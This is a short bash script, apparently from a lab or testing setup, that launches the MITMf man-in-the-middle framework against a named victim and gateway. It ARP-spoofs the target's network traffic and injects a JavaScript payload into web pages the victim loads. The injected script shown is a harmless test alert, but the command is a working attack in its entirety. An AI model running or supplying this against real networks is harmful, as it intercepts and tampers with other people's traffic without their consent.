#!/bin/bash

: ${gateway?"Need to set gateway"}
: ${victim?"Need to set victim"}
: ${interface?"Need to set interface"}

echo "m1tmf 5t4rt1ng ..."
echo $gateway
echo $victim
echo $interface

cd $HOME/isidis/MITMf
./mitmf.py --arp --spoof --gateway $gateway --targets $victim -i $interface --inject --js-payload "alert('test');" --log-level debug --arpmode rep
